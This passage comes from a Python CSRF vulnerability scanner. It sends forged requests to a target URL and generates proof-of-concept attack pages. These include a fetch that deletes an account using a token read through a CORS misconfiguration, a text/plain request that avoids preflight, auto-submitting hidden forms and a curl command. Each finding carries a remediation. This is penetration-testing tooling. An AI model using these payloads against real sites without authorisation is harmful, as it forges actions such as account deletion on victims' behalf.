            headers: {{
                'Content-Type': 'application/x-www-form-urlencoded'
            }},
            body: `csrf_token=${{token}}&action=delete_account`
        }});
    }}
}});
</script>
</body>
</html>"""

                finding = CSRFFinding(
                    title="CORS + CSRF Attack Chain",
                    severity=CSRFSeverity.CRITICAL,
                    vuln_type=CSRFVulnType.CORS_CSRF_CHAIN,
                    description="CORS misconfiguration allows reading CSRF token, enabling full CSRF",
                    endpoint=self.target_url,
                    poc_html=poc_html,
                    impact="Complete CSRF protection bypass via CORS",
                    recommendation="Fix CORS misconfiguration - do not allow arbitrary origins with credentials",
                    evidence={'acao': acao, 'acac': acac},
                    cwe_id="CWE-352"
                )
                self.findings.append(finding)
                self.tests_passed += 1
                print(f"    {Fore.RED}🚨 VULNERABLE: CORS allows reading CSRF token!{Style.RESET_ALL}")
        except Exception:
            pass

    def _test_content_type_csrf(self):
        """Test Content-Type based CSRF (JSON via text/plain)."""
        print("  Testing Content-Type based CSRF...")
        self.tests_run += 1

        # Try JSON payload with text/plain content-type
        json_payload = json.dumps({'action': 'delete', 'confirmed': True})

        try:
            response = self.session.request(
                self.method,
                self.target_url,
                headers={'Content-Type': 'text/plain'},
                data=json_payload,
                timeout=self.timeout,
                verify=self.verify_ssl
            )

            if self._is_successful(response):
                poc_html = f"""<!DOCTYPE html>
<html>
<head><title>Content-Type CSRF PoC</title></head>
<body>
<script>
fetch('{self.target_url}', {{
    method: '{self.method}',
    credentials: 'include',
    headers: {{
        'Content-Type': 'text/plain'
    }},
    body: '{json_payload}'
}});
</script>
</body>
</html>"""

                finding = CSRFFinding(
                    title="CSRF via Content-Type Bypass",
                    severity=CSRFSeverity.HIGH,
                    vuln_type=CSRFVulnType.CONTENT_TYPE_BYPASS,
                    description="JSON endpoint accepts text/plain, bypassing preflight",
                    endpoint=self.target_url,
                    payload=json_payload,
                    poc_html=poc_html,
                    impact="Attacker can send JSON payload without preflight request",
                    recommendation="Validate Content-Type header, only accept application/json",
                    evidence={'content_type': 'text/plain', 'response_code': response.status_code},
                    cwe_id="CWE-352"
                )
                self.findings.append(finding)
                self.tests_passed += 1
                print(f"    {Fore.RED}🚨 VULNERABLE: Content-Type bypass works!{Style.RESET_ALL}")
        except Exception:
            pass

    def _make_request(self, data: Optional[Dict] = None, headers: Optional[Dict] = None) -> Optional[requests.Response]:
        """Make HTTP request with data."""
        try:
            return self.session.request(
                self.method,
                self.target_url,
                data=data,
                headers=headers,
                timeout=self.timeout,
                verify=self.verify_ssl,
                allow_redirects=False
            )
        except Exception:
            return None

    def _is_successful(self, response: requests.Response) -> bool:
        """Check if request was successful."""
        # Consider 2xx and 3xx as success
        if 200 <= response.status_code < 400:
            # Also check for error messages in response
            error_indicators = [
                'invalid token',
                'csrf validation failed',
                'token mismatch',
                'invalid request',
                'forbidden'
            ]

            text_lower = response.text.lower()
            for indicator in error_indicators:
                if indicator in text_lower:
                    return False

            return True

        return False

    def _dict_to_query(self, data: Dict) -> str:
        """Convert dict to query string."""
        return '&'.join([f'{k}={quote(str(v))}' for k, v in data.items()])

    def _generate_form_poc(self, data: Dict, title: str = "CSRF PoC") -> str:
        """Generate HTML form PoC."""
        return f"""<!DOCTYPE html>
<html>
<head><title>{title}</title></head>
<body>
<h1>{title}</h1>
{self._generate_form_html(data)}
</body>
</html>"""

    def _generate_form_html(self, data: Dict) -> str:
        """Generate HTML form with auto-submit."""
        inputs = '\n    '.join([f'<input type="hidden" name="{k}" value="{v}" />' for k, v in data.items()])

        return f"""<form id="csrf" action="{self.target_url}" method="{self.method}">
    {inputs}
</form>
<script>
    document.getElementById('csrf').submit();
</script>"""

    def _generate_curl_poc(self, data: Dict) -> str:
        """Generate curl command PoC."""
        data_str = ' '.join([f"-d '{k}={v}'" for k, v in data.items()])
        return f"curl -X {self.method} '{self.target_url}' {data_str}"

    def _print_findings_summary(self):
        """Print summary of findings."""
        print(f"\n{Fore.RED}[!] CSRF VULNERABILITIES FOUND:{Style.RESET_ALL}")

        # Group by severity
        by_severity = {}
        for finding in self.findings:
            severity = finding.severity.value
            if severity not in by_severity:
                by_severity[severity] = []
            by_severity[severity].append(finding)

        # Print by severity
        for severity in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO']:
            if severity in by_severity:
                findings = by_severity[severity]
                print(f"\n{severity}: {len(findings)}")
                for f in findings[:3]:  # Show first 3
                    print(f"  - {f.title}")

    def get_findings(self) -> List[CSRFFinding]:
        """Get all findings."""
        return self.findings

    def get_findings_by_severity(self, severity: CSRFSeverity) -> List[CSRFFinding]:
        """Get findings by severity level."""
        return [f for f in self.findings if f.severity == severity]

    def get_summary(self) -> Dict[str, Any]:
        """Generate summary of test results."""
        severity_counts = {
            'CRITICAL': len(self.get_findings_by_severity(CSRFSeverity.CRITICAL)),
            'HIGH': len(self.get_findings_by_severity(CSRFSeverity.HIGH)),
            'MEDIUM': len(self.get_findings_by_severity(CSRFSeverity.MEDIUM)),
            'LOW': len(self.get_findings_by_severity(CSRFSeverity.LOW)),
            'INFO': len(self.get_findings_by_severity(CSRFSeverity.INFO))
        }

        return {
            'target': self.target_url,
            'total_tests': self.tests_run,
            'total_findings': len(self.findings),
            'severity_breakdown': severity_counts,
            'vulnerable': len(self.findings) > 0,
            'findings': [f.to_dict() for f in self.findings],
            'protection': {
                'csrf_token': self.protection.has_csrf_token if self.protection else False,
                'samesite': self.protection.samesite_value if self.protection else None,
                'referrer_check': self.protection.has_referrer_check if self.protection else False,
                'origin_check': self.protection.has_origin_check if self.protection else False,
            }
        }


def main():
    """CLI interface."""
    import sys

    if len(sys.argv) < 2:
        print("Usage: python csrf_tester.py <url> [method]")
        print("Example: python csrf_tester.py 'http://example.com/delete' POST")
        sys.exit(1)

    target_url = sys.argv[1]
    method = sys.argv[2] if len(sys.argv) > 2 else "POST"

    tester = CSRFTester(target_url, method=method)
    findings = tester.run_all_tests()

    print(f"\n{Fore.CYAN}=== FINAL RESULTS ==={Style.RESET_ALL}")
    print(f"Total tests: {tester.tests_run}")
    print(f"Findings: {len(findings)}")

    if findings:
        print(f"\n{Fore.RED}[!] CSRF vulnerabilities detected!{Style.RESET_ALL}")
        print(f"Review findings and validate manually.")


if __name__ == "__main__":
    main()
